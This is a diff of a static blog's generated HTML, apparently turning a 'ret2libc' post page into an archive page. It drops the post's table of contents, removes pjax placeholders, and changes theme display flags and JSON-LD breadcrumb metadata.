-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E4%BA%86%E8%A7%A3"><span class="toc-text">前置知识了解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wp%E6%BC%94%E7%A4%BA"><span class="toc-text">wp演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E5%85%85%EF%BC%9A"><span class="toc-text">补充：</span></a></li></ol>
-    </div>
-  </section>
-
-  
-
 </div>
 
 
 <!-- 没有 pjax 占位会报错 万恶的 pjax -->
-
-  <div class="pjax">
-    <!-- pjax占位 -->
-  </div>
-
-  <div class="pjax">
-    <!-- pjax占位 -->
-  </div>
-
-  <div class="pjax">
-    <!-- pjax占位 -->
-  </div>
-
-  <div class="pjax">
-    <!-- pjax占位 -->
-  </div>
 
   <div class="pjax">
     <!-- pjax占位 -->
@@ -2758,14 +2659,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </aside>
 
 
-
           <!--此文件用来存放一些不方便取值的变量-->
 <!--思路大概是将值藏到重加载的区域内-->
 
 <pjax>
 <script>
   window.pdata={}
-  pdata.ispage=true;
+  pdata.ispage=false;
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   pdata.commentConfig={};
@@ -2774,14 +2674,14 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     // header
     var l_header=document.getElementById("l_header");
     
-    l_header.classList.add("show");
+    l_header.classList.remove("show");
     
     
       // cover
       var cover_wrapper=document.querySelector('#l_cover .cover-wrapper');
       var scroll_down=document.getElementById('scroll-down');
-      cover_wrapper.id="none";
-      cover_wrapper.style.display="none";
+      cover_wrapper.id="half";
+      cover_wrapper.style.display="";
       scroll_down.style.display="none";
     
   
@@ -3279,7 +3179,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 </script>
 
 
-  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/categories/栈/","name":"栈"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/2022/09/23/ret2libc/","name":"ret2libc"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","headline":"ret2libc","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2022/09/23/ret2libc/"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"url":"http://example.com/2022/09/23/ret2libc/","wordCount":0,"datePublished":"2022-09-23T12:53:48.000Z","dateModified":"2022-09-24T16:01:54.574Z","articleSection":"栈","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
+  <script type="application/ld+json">[{"@context":"http://schema.org","@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},{"@context":"http://schema.org","@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","sameAs":["https://github.com/volantis-x"],"description":"ChenBlog"},{"@context":"http://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"http://example.com/","name":"Chen"}},{"@type":"ListItem","position":2,"item":{"@id":"http://example.com/archives/","name":"Archive"}},{"@type":"ListItem","position":3,"item":{"@id":"http://example.com/archives/2022/","name":"2022"}}]},{"@context":"http://schema.org","@type":"WebSite","name":"Chen","url":"http://example.com/","keywords":null,"description":"ChenBlog","author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/","description":"ChenBlog"},"publisher":{"@type":"Organization","name":"Chen","url":"http://example.com/","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"potentialAction":{"@type":"SearchAction","name":"Site Search","target":{"@type":"EntryPoint","urlTemplate":"http://example.com?s={search_term_string}"},"query-input":"required name=search_term_string"}},{"@context":"http://schema.org","@type":"BlogPosting","description":"ChenBlog","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage"},"author":{"@type":"Person","name":"Chen","image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png"},"url":"http://example.com/"},"publisher":{"@type":"Organization","name":"Chen","logo":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}},"wordCount":0,"image":{"@type":"ImageObject","url":"https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png","width":192,"height":192}}]</script>
 
 
 
